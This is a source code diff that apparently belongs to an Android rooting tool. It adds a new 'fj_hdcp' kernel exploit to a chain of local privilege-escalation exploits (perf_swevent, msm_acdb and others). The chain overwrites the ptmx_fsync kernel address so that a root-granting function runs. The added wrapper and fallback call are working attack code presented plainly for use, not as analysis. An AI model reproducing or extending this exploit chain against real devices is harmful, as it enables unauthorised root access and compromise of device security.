@@ -16,6 +16,7 @@
 #include "libdiagexploit/diag.h"
 #include "libperf_event_exploit/perf_event.h"
 #include "libmsm_acdb_exploit/acdb.h"
+#include "libfj_hdcp_exploit/fj_hdcp.h"
 
 void
 obtain_root_privilege(void)
@@ -62,6 +63,20 @@ attempt_acdb_exploit(unsigned long int address, unsigned long int original_value
 }
 
 static bool
+attempt_fj_hdcp_exploit(unsigned long int address, unsigned long int original_value)
+{
+  if (fj_hdcp_run_exploit(address, (int)&obtain_root_privilege,
+                          run_obtain_root_privilege, NULL)) {
+
+    fj_hdcp_write_value_at_address(address, original_value);
+
+    return true;
+  }
+
+  return false;
+}
+
+static bool
 run_exploit(void)
 {
   unsigned long int ptmx_fsync_address;
@@ -83,6 +98,12 @@ run_exploit(void)
   printf("Attempt perf_swevent exploit...\n");
   if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
                                   run_obtain_root_privilege, NULL)) {
+    return true;
+  }
+  printf("\n");
+
+  printf("Attempt fj_hdcp exploit...\n");
+  if (attempt_fj_hdcp_exploit(ptmx_fsync_address, 0)) {
     return true;
   }
   printf("\n");
